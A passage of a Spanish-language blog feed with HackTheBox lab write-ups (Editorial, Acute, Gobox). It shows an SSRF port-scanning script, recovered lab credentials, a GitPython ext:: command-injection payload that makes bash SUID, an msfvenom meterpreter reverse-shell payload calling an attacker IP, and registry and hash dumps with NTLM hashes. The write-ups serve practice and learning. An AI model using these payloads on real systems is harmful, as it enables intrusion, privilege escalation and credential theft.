    <span class="n">clength</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"Content-Length"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">clength</span>

<span class="k">def</span> <span class="nf">worker</span><span class="p">(</span><span class="n">port_queue</span><span class="p">):</span>
    <span class="k">while</span> <span class="ow">not</span> <span class="n">port_queue</span><span class="p">.</span><span class="n">empty</span><span class="p">():</span>
        <span class="n">i</span> <span class="o">=</span> <span class="n">port_queue</span><span class="p">.</span><span class="n">get</span><span class="p">()</span>
        <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""------WebKitFormBoundaryxCyQMtVBFzp73HTl</span><span class="se">\n</span><span class="s">Content-Disposition: form-data; name="bookurl"</span><span class="se">\n\n</span><span class="s">http://127.0.0.1:</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="se">\n</span><span class="s">------WebKitFormBoundaryxCyQMtVBFzp73HTl</span><span class="se">\n</span><span class="s">Content-Disposition: form-data; name="bookfile"; filename=""</span><span class="se">\n</span><span class="s">Content-Type: application/octet-stream</span><span class="se">\n\n\n</span><span class="s">------WebKitFormBoundaryxCyQMtVBFzp73HTl--"""</span>

        <span class="n">response_length</span> <span class="o">=</span> <span class="n">fuzzing</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">response_length</span> <span class="o">!=</span> <span class="s">"61"</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Puerto:</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> encontrado"</span><span class="p">)</span>

        <span class="n">port_queue</span><span class="p">.</span><span class="n">task_done</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">pwnlogs</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Iniciando fuerza bruta"</span><span class="p">)</span>
    <span class="n">progress</span> <span class="o">=</span> <span class="n">pwnlogs</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Probando puertos"</span><span class="p">)</span>

    <span class="n">port_queue</span> <span class="o">=</span> <span class="n">queue</span><span class="p">.</span><span class="n">Queue</span><span class="p">()</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">65535</span><span class="p">):</span>
        <span class="n">port_queue</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

    <span class="n">num_threads</span> <span class="o">=</span> <span class="mi">30</span>
    <span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_threads</span><span class="p">):</span>
        <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">worker</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">port_queue</span><span class="p">,))</span>
        <span class="n">thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
        <span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">thread</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">thread</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
        <span class="n">thread</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div></div>
<p>Para este script utilizamos hilos para que haga más rápido el trabajo, el ejecutarlo nos encontramo con lo siguiente.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guero@guero<span class="nv">$ </span>python3 exploit.py
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Iniciando fuerza bruta
<span class="o">[</span>&lt;<span class="o">]</span> Probando puertos
Puerto:5000 encontrado
</code></pre></div></div>
<p>Vemos que pasa cuando ponemos este puerto en la petición de burpsuite.Nos arroja una liga donde podemos descargar un archivo. Para esto lo intenté unas cuántas veces porque me daba errores la liga.</p>

<p><img src="/assets/img/machines/editorial/editorial3.jpg" alt="imagen3" /></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guero@guero<span class="nv">$ </span>wget http://editorial.htb/static/uploads/33bf0431-5b5e-4d19-896a-1f18aa797401
<span class="nt">--2024-06-23</span> 19:29:56--  http://editorial.htb/static/uploads/33bf0431-5b5e-4d19-896a-1f18aa797401
Resolving editorial.htb <span class="o">(</span>editorial.htb<span class="o">)</span>... 10.10.11.20
Connecting to editorial.htb <span class="o">(</span>editorial.htb<span class="o">)</span>|10.10.11.20|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 911 <span class="o">[</span>application/octet-stream]
Saving to: ‘33bf0431-5b5e-4d19-896a-1f18aa797401’

33bf0431-5b5e-4d19-896a-1f18aa797401       100%[<span class="o">======================================================================================&gt;]</span>     911  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      

2024-06-23 19:29:56 <span class="o">(</span>122 MB/s<span class="o">)</span> - ‘33bf0431-5b5e-4d19-896a-1f18aa797401’ saved <span class="o">[</span>911/911]
</code></pre></div></div>
<p>Nos encontramos con un archivo que contiene datos de alguna api</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guero@guero<span class="nv">$ </span><span class="nb">cat </span>33bf0431-5b5e-4d19-896a-1f18aa797401 | jq
<span class="o">{</span>
  <span class="s2">"messages"</span>: <span class="o">[</span>
    <span class="o">{</span>
      <span class="s2">"promotions"</span>: <span class="o">{</span>
        <span class="s2">"description"</span>: <span class="s2">"Retrieve a list of all the promotions in our library."</span>,
        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata/messages/promos"</span>,
        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"coupons"</span>: <span class="o">{</span>
        <span class="s2">"description"</span>: <span class="s2">"Retrieve the list of coupons to use in our library."</span>,
        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata/messages/coupons"</span>,
        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"new_authors"</span>: <span class="o">{</span>
        <span class="s2">"description"</span>: <span class="s2">"Retrieve the welcome message sended to our new authors."</span>,
        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata/messages/authors"</span>,
        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"platform_use"</span>: <span class="o">{</span>
        <span class="s2">"description"</span>: <span class="s2">"Retrieve examples of how to use the platform."</span>,
        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata/messages/how_to_use_platform"</span>,
        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">]</span>,
  <span class="s2">"version"</span>: <span class="o">[</span>
    <span class="o">{</span>
      <span class="s2">"changelog"</span>: <span class="o">{</span>
        <span class="s2">"description"</span>: <span class="s2">"Retrieve a list of all the versions and updates of the api."</span>,
        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata/changelog"</span>,
        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"latest"</span>: <span class="o">{</span>
        <span class="s2">"description"</span>: <span class="s2">"Retrieve the last version of api."</span>,
        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata"</span>,
        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">]</span>
<span class="o">}</span>
</code></pre></div></div>
<p>Realizamos el mismo procedimiento para ver estos endpoints</p>

<p><img src="/assets/img/machines/editorial/editorial4.jpg" alt="imagen4" /></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guero@guero<span class="nv">$ </span>curl <span class="nt">-s</span> http://editorial.htb/static/uploads/86f4bfec-ccce-4ab3-b012-0901752e0318  | jq
<span class="o">{</span>
  <span class="s2">"template_mail_message"</span>: <span class="s2">"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.</span><span class="se">\n\n</span><span class="s2">Your login credentials for our internal forum and authors site are:</span><span class="se">\n</span><span class="s2">Username: dev</span><span class="se">\n</span><span class="s2">Password: dev080217_devAPI!@</span><span class="se">\n</span><span class="s2">Please be sure to change your password as soon as possible for security purposes.</span><span class="se">\n\n</span><span class="s2">Don't hesitate to reach out if you have any questions or ideas - we're always here to support you.</span><span class="se">\n\n</span><span class="s2">Best regards, Editorial Tiempo Arriba Team."</span>
<span class="o">}</span>
</code></pre></div></div>
<p>Nos encontramos con un usuario y contraseña, al probarlo con ssh podemos entrar al sistema.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh dev@editorial.htb 
The authenticity of host <span class="s1">'editorial.htb (10.10.11.20)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>editorial.htb<span class="s1">' (ED25519) to the list of known hosts.
dev@editorial.htb'</span>s password: 
Welcome to Ubuntu 22.04.4 LTS <span class="o">(</span>GNU/Linux 5.15.0-112-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/pro

 System information as of Mon Jun 24 01:43:24 AM UTC 2024

  System load:           0.0
  Usage of /:            61.5% of 6.35GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             224
  Users logged <span class="k">in</span>:       0
  IPv4 address <span class="k">for </span>eth0: 10.10.11.20
  IPv6 address <span class="k">for </span>eth0: dead:beef::250:56ff:feb0:e7c3

</code></pre></div></div>
<p>Dentro encontramos la carpeta app y dentro encontramos un archivo .git, al tener el programa instalado en la máquina podemos ver los logs históricos, en uno de ellos podemos ver la contraseña del usuario prod.</p>

<pre><code class="language-git">-bash-5.1$ ls -la
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 4 dev dev 4096 Jun  5 14:36 ..
drwxr-xr-x 8 dev dev 4096 Jun 24 01:45 .git
-bash-5.1$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -&gt; master)
Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

&lt;SNIP&gt;

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app

-bash-5.1$ git diff 1e84a036b2f33c59e2390730699a488c65643d28
diff --git a/app_api/app.py b/app_api/app.py
deleted file mode 100644
index 61b786f..0000000
--- a/app_api/app.py
+++ /dev/null
@@ -1,74 +0,0 @@
--- a/app_api/app.py
+++ /dev/null
@@ -1,74 +0,0 @@
-# API (in development).
-# * To retrieve info about editorial
-
-import json
-from flask import Flask, jsonify
-
-# -------------------------------
-# App configuration
-# -------------------------------
-app = Flask(__name__)
-
-# -------------------------------
-# Global Variables
-# -------------------------------
-api_route = "/api/latest/metadata"
-api_editorial_name = "Editorial Tiempo Arriba"
-api_editorial_email = "info@tiempoarriba.htb"
-
-# -------------------------------
-# API routes
-# -------------------------------
-# -- : home
-@app.route('/api', methods=['GET'])
-def index():
-    data_editorial = {
-        'version': [{
-            '1': {
-                'editorial': 'Editorial El Tiempo Por Arriba', 
-                'contact_email_1': 'soporte@tiempoarriba.oc',
-                'contact_email_2': 'info@tiempoarriba.oc',
-                'api_route': '/api/v1/metadata/'
-            }},
-            {
-            '1.1': {
-                'editorial': 'Ed Tiempo Arriba', 
-                'contact_email_1': 'soporte@tiempoarriba.oc',
-                'contact_email_2': 'info@tiempoarriba.oc',
-                'api_route': '/api/v1.1/metadata/'
-            }},
-            {
-            '1.2': {
-                'editorial': api_editorial_name, 
-                'contact_email_1': 'soporte@tiempoarriba.oc',
-                'contact_email_2': 'info@tiempoarriba.oc',
-                'api_route': f'/api/v1.2/metadata/'
-            }},
-            {
-            '2': {
-                'editorial': api_editorial_name, 
-                'contact_email': 'info@tiempoarriba.moc.oc',
-                'api_route': f'/api/v2/metadata/'
-            }},
-            {
-            '2.3': {
-                'editorial': api_editorial_name, 
-                'contact_email': api_editorial_email,
-                'api_route': f'{api_route}/'
-            }
-        }]
-    }
-    return jsonify(data_editorial)
-
-# -- : (development) mail message to new authors
-            }},
-            {
-            '2': {
-                'editorial': api_editorial_name, 
-                'contact_email': 'info@tiempoarriba.moc.oc',
-                'api_route': f'/api/v2/metadata/'
-            }},
-            {
-            '2.3': {
-                'editorial': api_editorial_name, 
-                'contact_email': api_editorial_email,
-                'api_route': f'{api_route}/'
-            }
-        }]
-    }
-    return jsonify(data_editorial)
-
-# -- : (development) mail message to new authors
-@app.route(api_route + '/authors/message', methods=['GET'])
-def api_mail_new_authors():
-    return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
-    }) # TODO: replace dev credentials when checks pass
-
-# -------------------------------
-# Start program
-# -------------------------------
-if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=5001, debug=True)
</code></pre>
<p>Con estas contraseñas podemos cambiar al usuario <code class="language-plaintext highlighter-rouge">prod</code> y viendo sus permisos sudo vemos lo siguiente:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.1<span class="nv">$ </span>su prod
Password: 
bash-5.1<span class="nv">$ </span><span class="nb">whoami
</span>prod
bash-5.1<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>prod: 
Matching Defaults entries <span class="k">for </span>prod on editorial:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User prod may run the following commands on editorial:
    <span class="o">(</span>root<span class="o">)</span> /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span class="k">*</span>
</code></pre></div></div>
<p>Este script contiene lo siguiente:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">git</span> <span class="kn">import</span> <span class="n">Repo</span>

<span class="n">os</span><span class="p">.</span><span class="n">chdir</span><span class="p">(</span><span class="s">'/opt/internal_apps/clone_changes'</span><span class="p">)</span>

<span class="n">url_to_clone</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">Repo</span><span class="p">.</span><span class="n">init</span><span class="p">(</span><span class="s">''</span><span class="p">,</span> <span class="n">bare</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">clone_from</span><span class="p">(</span><span class="n">url_to_clone</span><span class="p">,</span> <span class="s">'new_changes'</span><span class="p">,</span> <span class="n">multi_options</span><span class="o">=</span><span class="p">[</span><span class="s">"-c protocol.ext.allow=always"</span><span class="p">])</span>
</code></pre></div></div>
<p>Investigando un poco nos encontramos con la vulnerabilidad <a href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858">CVE-2022-24439</a>, realizamos lo siguiente para obtener una bash con privilegios.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.1<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span class="s1">'ext::sh -c chmod% u+s /bin/bash'</span>
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"/opt/internal_apps/clone_changes/clone_prod_change.py"</span>, line 12, <span class="k">in</span> &lt;module&gt;
    r.clone_from<span class="o">(</span>url_to_clone, <span class="s1">'new_changes'</span>, <span class="nv">multi_options</span><span class="o">=[</span><span class="s2">"-c protocol.ext.allow=always"</span><span class="o">])</span>
  File <span class="s2">"/usr/local/lib/python3.10/dist-packages/git/repo/base.py"</span>, line 1275, <span class="k">in </span>clone_from
    <span class="k">return </span>cls._clone<span class="o">(</span>git, url, to_path, GitCmdObjectDB, progress, multi_options, <span class="k">**</span>kwargs<span class="o">)</span>
  File <span class="s2">"/usr/local/lib/python3.10/dist-packages/git/repo/base.py"</span>, line 1194, <span class="k">in </span>_clone
    finalize_process<span class="o">(</span>proc, <span class="nv">stderr</span><span class="o">=</span>stderr<span class="o">)</span>
  File <span class="s2">"/usr/local/lib/python3.10/dist-packages/git/util.py"</span>, line 419, <span class="k">in </span>finalize_process
    proc.wait<span class="o">(</span><span class="k">**</span>kwargs<span class="o">)</span>
  File <span class="s2">"/usr/local/lib/python3.10/dist-packages/git/cmd.py"</span>, line 559, <span class="k">in </span><span class="nb">wait
    </span>raise GitCommandError<span class="o">(</span>remove_password_if_present<span class="o">(</span>self.args<span class="o">)</span>, status, errstr<span class="o">)</span>
git.exc.GitCommandError: Cmd<span class="o">(</span><span class="s1">'git'</span><span class="o">)</span> failed due to: <span class="nb">exit </span>code<span class="o">(</span>128<span class="o">)</span>
  cmdline: git clone <span class="nt">-v</span> <span class="nt">-c</span> protocol.ext.allow<span class="o">=</span>always ext::sh <span class="nt">-c</span> <span class="nb">chmod</span>% u+s /bin/bash new_changes
  stderr: <span class="s1">'Cloning into '</span>new_changes<span class="s1">'...
chmod: missing operand after '</span>u+s<span class="s1">'
Try '</span><span class="nb">chmod</span> <span class="nt">--help</span><span class="s1">' for more information.
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'</span>
bash-5.1<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /bin/bash
<span class="nt">-rwsr-xr-x</span> 1 root root 1396520 Mar 14 11:31 /bin/bash
bash-5.1<span class="nv">$ </span>bash <span class="nt">-p</span>
bash-5.1# <span class="nb">whoami
</span>root
</code></pre></div></div>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="machines" /><category term="htb" /><summary type="html"><![CDATA[Los primero pasos es escanear la máquina para saber que puertos están abiertos.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/machines/editorial/logo.JPG" /><media:content medium="image" url="http://localhost:4000/assets/img/machines/editorial/logo.JPG" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">OSCP</title><link href="http://localhost:4000/blog/certificates/2024-06-21-oscp/" rel="alternate" type="text/html" title="OSCP" /><published>2024-06-21T00:00:00-06:00</published><updated>2024-06-21T00:00:00-06:00</updated><id>http://localhost:4000/blog/certificates/oscp</id><content type="html" xml:base="http://localhost:4000/blog/certificates/2024-06-21-oscp/"><![CDATA[<p>El certificado que más me consto económica y mentalmente.</p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="certificates" /><summary type="html"><![CDATA[El certificado que más me consto económica y mentalmente.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/certifications/OSCP.png" /><media:content medium="image" url="http://localhost:4000/assets/img/certifications/OSCP.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Acute</title><link href="http://localhost:4000/blog/example/2024-06-20-machine/" rel="alternate" type="text/html" title="Acute" /><published>2024-06-20T00:00:00-06:00</published><updated>2024-06-20T00:00:00-06:00</updated><id>http://localhost:4000/blog/example/machine</id><content type="html" xml:base="http://localhost:4000/blog/example/2024-06-20-machine/"><![CDATA[<p>Lo más relevante de esta máquina fue</p>

<p>pudimos usar <code class="language-plaintext highlighter-rouge">exiftools</code> para poder ver los metadatos del archivo encontrado en la web</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exiftools document.docx
</code></pre></div></div>

<p>Ganamos acceso a la máquina y usamos metaexploit para poder user <code class="language-plaintext highlighter-rouge">screenshare</code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.16.8 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> msf.exe

<span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> <span class="o">&gt;&gt;</span> use exploit/multi/handler
<span class="nb">set </span>payload windows/x64/meterpreter_reverse_tcp
<span class="nb">set </span>LHOST 10.10.10.10
<span class="nb">set </span>LPORT 443

</code></pre></div></div>

<p>Tenemos una constraseñas del usuari imonk, procedemos a utilizar pscredentials</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$passwd</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'W3_4R3_th3_f0rce'</span> <span class="nt">-AsPlaintext</span> <span class="nt">-Force</span>
<span class="nv">$cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'acute\imonks'</span>,<span class="nv">$passwd</span><span class="o">)</span>
Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span><span class="nb">whoami</span><span class="o">}</span>
</code></pre></div></div>

<p>Obteniendo un script que podemos manipular, podemos modificarlo para entablarnos una reverse shell, utilizamos el mismo que teníamos en la carpeta Utils.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{((</span>Get-Content C:<span class="se">\U</span>sers<span class="se">\i</span>monks<span class="se">\D</span>esktop<span class="se">\w</span>m.ps1 <span class="nt">-Raw</span><span class="o">)</span> 
<span class="nt">-Replace</span> <span class="s1">'Get-Volume'</span>,<span class="s1">'cmd.exe /c C:\Utils\shell.exe'</span><span class="o">)</span> | Set-Content <span class="nt">-Path</span> C:<span class="se">\U</span>sers<span class="se">\i</span>monks<span class="se">\D</span>esktop<span class="se">\w</span>m.ps1<span class="o">}</span>
</code></pre></div></div>

<p>Ganamos acceso como otro usuario, podemos hacer lo siguiente ya que está dentro del grupo administradores, podemos intentar obtener los hashes de los usuarios con 
<code class="language-plaintext highlighter-rouge">secretsdump</code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save HKLM<span class="se">\S</span>AM sam.backup
reg save HKLM<span class="se">\S</span>YSTEM system.backup
</code></pre></div></div>

<p>Incluso con metasploit podremos obtener los hashes y podemos intentar crackearlos para obtener la contraseña.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::
</code></pre></div></div>

<p>Con la contraseña podemos tener acceso a otro usuario por lo que revisando la máquina, vemos que hay un archivo en program files
que indica que cada 5 min ejecuta el archivo .bat, con Set-Content podemos crearnos un arcbivo asignando a nuestro usuario al grupo de domain_admins, utilizamos Siteadmin porque según la desripción
este grupo tiene los privilegios del grupo domain admins.</p>

<p><img src="/assets/img/blog/acute1.jpg" alt="imagen1" /></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span><span class="nb">type </span>C:<span class="se">\P</span>ROGRA~1<span class="se">\k</span>eepmeon<span class="se">\k</span>eepmeon.bat<span class="o">}</span>
Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span>Set-Content C:<span class="se">\P</span>ROGRA~1<span class="se">\k</span>eepmeon<span class="se">\p</span>wned.bat <span class="nt">-Value</span> <span class="s1">'net group Site_Admin awallace /domain /add'</span><span class="o">}</span>
</code></pre></div></div>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="example" /><summary type="html"><![CDATA[Version 9.1 provides minor design changes, new features, and closes multiple issues.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">CPTS</title><link href="http://localhost:4000/blog/certificates/2023-07-14-cpts/" rel="alternate" type="text/html" title="CPTS" /><published>2023-07-14T00:00:00-06:00</published><updated>2023-07-14T00:00:00-06:00</updated><id>http://localhost:4000/blog/certificates/cpts</id><content type="html" xml:base="http://localhost:4000/blog/certificates/2023-07-14-cpts/"><![CDATA[<p>El certificado que más me consto económica y mentalmente.</p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="certificates" /><summary type="html"><![CDATA[El certificado que más me consto económica y mentalmente.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/certifications/CPTS.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/certifications/CPTS.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">PNPT</title><link href="http://localhost:4000/blog/certificates/2023-06-01-pnpt/" rel="alternate" type="text/html" title="PNPT" /><published>2023-06-01T00:00:00-06:00</published><updated>2023-06-01T00:00:00-06:00</updated><id>http://localhost:4000/blog/certificates/pnpt</id><content type="html" xml:base="http://localhost:4000/blog/certificates/2023-06-01-pnpt/"><![CDATA[<p>El certificado que más me consto económica y mentalmente.</p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="certificates" /><summary type="html"><![CDATA[El certificado que más me consto económica y mentalmente.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/certifications/PNPT.png" /><media:content medium="image" url="http://localhost:4000/assets/img/certifications/PNPT.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Gobox</title><link href="http://localhost:4000/blog/machines/2022-09-29-gobox/" rel="alternate" type="text/html" title="Gobox" /><published>2022-09-29T00:00:00-05:00</published><updated>2022-09-29T00:00:00-05:00</updated><id>http://localhost:4000/blog/machines/gobox</id><content type="html" xml:base="http://localhost:4000/blog/machines/2022-09-29-gobox/"><![CDATA[<p>Vemos el puerto 80 y 8080, donde en el puerto 80 no encontramos nada interesante pero en el 8080 encontramos un login.</p>

<p><img src="/assets/img/machines/gobox/gobox.png" alt="imagen1" /></p>

<p><img src="/assets/img/machines/gobox/gobox2.png" alt="imagen2" />
En este punto vemos por medio de burpsuite que estamos en un servidor golang e intentamos un ssti.</p>

<p><img src="/assets/img/machines/gobox/gobox3.png" alt="imagen3" /></p>

<p><img src="/assets/img/machines/gobox/gobox4.png" alt="imagen4" /></p>

